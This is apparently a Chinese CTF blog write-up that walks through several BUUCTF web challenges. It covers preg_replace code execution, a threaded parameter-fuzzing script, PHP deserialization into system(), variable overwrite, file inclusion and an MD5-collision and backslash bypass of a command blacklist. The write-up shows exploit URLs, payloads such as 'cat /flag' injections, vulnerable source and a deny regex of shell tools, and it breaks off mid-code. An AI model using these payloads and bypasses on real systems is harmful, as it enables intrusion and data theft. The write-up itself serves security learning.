<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，</span><br><span class="line">所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。</span><br><span class="line">缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，</span><br><span class="line">其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://782b0190-5c38-4b54-8eb7-bd142a799980.node3.buuoj.cn/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://www.cnblogs.com/HelloCTF/p/13184476.html">preg_replace函数/e 模式下的代码执行+一道例题 - Hel10 - 博客园 (cnblogs.com)</a></p>
<p>[(44条消息) <a href="https://blog.csdn.net/RABCDXB/article/details/115363699">BJDCTF2020]ZJCTF，不过如此_Sk1y的博客-CSDN博客</a></p>
<h1 id="强网杯-2019-高明的黑客1-多线程脚本"><a href="#强网杯-2019-高明的黑客1-多线程脚本" class="headerlink" title="[强网杯 2019]高明的黑客1  多线程脚本"></a>[强网杯 2019]高明的黑客1  多线程脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">8</span>  <span class="comment"># 设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>  <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"></span><br><span class="line">sem = threading.Semaphore(<span class="number">30</span>)  <span class="comment"># 设置最大线程数 ,别设置太大，不然还是会崩的挺厉害的，跑到关键的爆炸，心态就爆炸了</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b751b59d-ba6b-4c1d-b529-fb28c591ffa1.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载的源文件路径,根据自己的路径修改</span></span><br><span class="line">path = <span class="string">r&quot;C:\Users\jyj\Downloads\www\src\\&quot;</span></span><br><span class="line"></span><br><span class="line">rrGET = re.<span class="built_in">compile</span>(<span class="string">r&quot;\$_GET\[\&#x27;(\w+)\&#x27;\]&quot;</span>)  <span class="comment"># 匹配get参数</span></span><br><span class="line"></span><br><span class="line">rrPOST = re.<span class="built_in">compile</span>(<span class="string">r&quot;\$_POST\[\&#x27;(\w+)\&#x27;\]&quot;</span>)  <span class="comment"># 匹配post参数</span></span><br><span class="line"></span><br><span class="line">fileNames = os.listdir(path)  <span class="comment"># 列出目录中的文件,以每个文件都开一个线程</span></span><br><span class="line"></span><br><span class="line">local_file = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">fileName</span>):</span></span><br><span class="line">    <span class="keyword">with</span> sem:</span><br><span class="line">        file = <span class="built_in">open</span>(path + fileName, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        content = file.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]checking:%s&quot;</span> % fileName)</span><br><span class="line">        <span class="comment"># 测试get的参数</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rrGET.findall(content):</span><br><span class="line">            r = session.get(url + <span class="string">&quot;%s?%s=%s&quot;</span> % (fileName, i, <span class="string">&quot;echo ~h3zh1~;&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;~h3zh1~&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag = <span class="string">&quot;You Find it in GET fileName = %s and param = %s \n&quot;</span> % (fileName, i)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                local_file.write(flag)</span><br><span class="line">    <span class="comment"># 测试post的参数</span></span><br><span class="line">    <span class="comment"># for i in rrPOST.findall(content):</span></span><br><span class="line">    <span class="comment">#	r = session.post( url + fileName , data = &#123; i : &quot;echo ~h3zh1~;&quot; &#125; )</span></span><br><span class="line">    <span class="comment">#	if &quot;~h3zh1~&quot; in r.text:</span></span><br><span class="line">    <span class="comment">#		flag = &quot;You Find it in POST: fileName = %s and param = %s \n&quot; % ( fileName, i )</span></span><br><span class="line">    <span class="comment">#		print(flag)</span></span><br><span class="line">    <span class="comment">#		local_file.writelines(flag)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start_time = time.time()  <span class="comment"># 开始时间</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[start]程序开始:&quot;</span> + <span class="built_in">str</span>(start_time))</span><br><span class="line">    thread_list = []</span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</span><br><span class="line">        t = threading.Thread(target=run, args=(fileName,))</span><br><span class="line">        thread_list.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    local_file.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[end]程序结束:用时(秒):&quot;</span> + <span class="built_in">str</span>(end_time - start_time))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>水平有限，不知道这个脚本哪里出问题了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://b3ade54715324b4aa9576af2310e8fd5.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure>

<p>参考文章：[<a href="https://www.cnblogs.com/h3zh1/p/12661892.html">强网杯 2019]高明的黑客 - 何止(h3zh1) - 博客园 (cnblogs.com)</a></p>
<h1 id="网鼎杯-2020-朱雀组-phpweb1反序列化"><a href="#网鼎杯-2020-朱雀组-phpweb1反序列化" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb1反序列化"></a>[网鼎杯 2020 朱雀组]phpweb1反序列化</h1><h2 id="能够读取文件的函数"><a href="#能够读取文件的函数" class="headerlink" title="能够读取文件的函数"></a>能够读取文件的函数</h2><p>fread   fgets  fgetss   file  readfile  file_get_contents  fpassthru parse_ini_file</p>
<p>参考文章：<a href="https://www.jb51.net/article/53266.htm">https://www.jb51.net/article/53266.htm</a></p>
<p>因为页面不停更新，因此尝试抓包，发现传递的参数，第一个为函数，第二个为函数里面的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">&quot;index.php&quot;</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">&#x27;date&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">&quot;index.php&quot;</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">&#x27;date&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Text()函数利用了gettime()函数，可以构成反序列化，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"> <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到序列化后的结果，接着反序列化传参，并且修改命令</p>
<p>参考文章：<a href="https://www.cnblogs.com/jiluxuexi/p/13148685.html">https://www.cnblogs.com/jiluxuexi/p/13148685.html</a></p>
<h1 id="BJDCTF2020-Mark-loves-cat1"><a href="#BJDCTF2020-Mark-loves-cat1" class="headerlink" title="[BJDCTF2020]Mark loves cat1"></a>[BJDCTF2020]Mark loves cat1</h1><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><p><a href="https://blog.csdn.net/qq_45521281/article/details/105849770">(45条消息) 变量覆盖漏洞总结_WHOAMIAnony的博客-CSDN博客_变量覆盖漏洞</a></p>
<p>没扫出来，直接看了wp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;         </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>?is=flag&amp;flag=flag</p>
<p>exit（） 是一个在许多 操作系统 命令行 壳层 和 脚本语言 中含有的命令，此命令导致shell或程序 终止 。 如果在交互式命令shell中执行，将会注销用户的当前会话，或断开用户当前的 控制台 或 终端 连接。</p>
<p><strong>中文名:</strong> exit()</p>
<p><strong>函数名:</strong> exit()</p>
<p><strong>参数:</strong> status //程序退出的返回值.</p>
<h1 id="BSidesCF-2020-Had-a-bad-day1"><a href="#BSidesCF-2020-Had-a-bad-day1" class="headerlink" title="[BSidesCF 2020]Had a bad day1"></a>[BSidesCF 2020]Had a bad day1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">			<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">					<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="http://ebd8e4e6-736c-484a-a80e-d728c049ba69.node4.buuoj.cn:81/index.php?category=woofers">http://ebd8e4e6-736c-484a-a80e-d728c049ba69.node4.buuoj.cn:81/index.php?category=woofers</a></p>
<p>首先观察这个url ，存在index.php文件，利用伪协议读取一下，返现有错误，</p>
<p>category=woofers就没有Php，尝试把后面的php删除掉，然后就读出了上面的内容。需要包含上面的任何一个才能读取出来，因此按照上面的构造</p>
<h1 id="安洵杯-2019-easy-web1"><a href="#安洵杯-2019-easy-web1" class="headerlink" title="[安洵杯 2019]easy_web1"></a>[安洵杯 2019]easy_web1</h1><p><strong>img在存入后台的时候先进行一次hex加密，然后进行两次base64加密，对img进行解密，得到555.php,猜测源码在index.php文件中，进行加密得到源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) </span><br></pre></td></tr></table></figure>

<p>首先要满足这个条件才能进行输出执行cmd，</p>
<h2 id="MD5强碰撞"><a href="#MD5强碰撞" class="headerlink" title="MD5强碰撞"></a>MD5强碰撞</h2><p>可以采用数组和字符串，这里强子要求采用字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以绕过，注意要求是采用post的方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>))</span><br></pre></td></tr></table></figure>

<p>绕过了好多命令</p>
<p>ls   —&gt;  dir</p>
<p>我们发现禁用了tac nl more less head tail cat od 等一些可以读取文件内容的关键字，注意看后面的|\|\\|，我们都知道在php中正则过滤反斜杠要写四个\字符，因为会经过两次解析，一次php解析器的解析，另一次是正则表达式的解析。\\，先经过php的解析成\，再经过正则表达式的解析成\，但是前面又多了一个\，经过php的解析成\，|这个字符在正则中是保留字符，所以可以转义，再经过正则的解析时\会与后面的|一起解析成|，问题就出现在这一块，整个来看，先经过php的解析成||\|，再经过正则的解析成|||，所以最后匹配的是|\而不是\，所以我们可以用反斜杠绕过</p>
<p>cmd=dir%20/ 发现flag</p>
<p>③cmd=ca\t%20/flag 得到flag</p>
<p>原文链接：<a href="https://blog.csdn.net/Whaocai/article/details/119321047">https://blog.csdn.net/Whaocai/article/details/119321047</a></p>
<h1 id="NCTF2019-Fake-XML-cookbook1"><a href="#NCTF2019-Fake-XML-cookbook1" class="headerlink" title="[NCTF2019]Fake XML cookbook1"></a>[NCTF2019]Fake XML cookbook1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		alert(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        url: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        contentType: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        anysc: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">&quot;code&quot;</span>)[<span 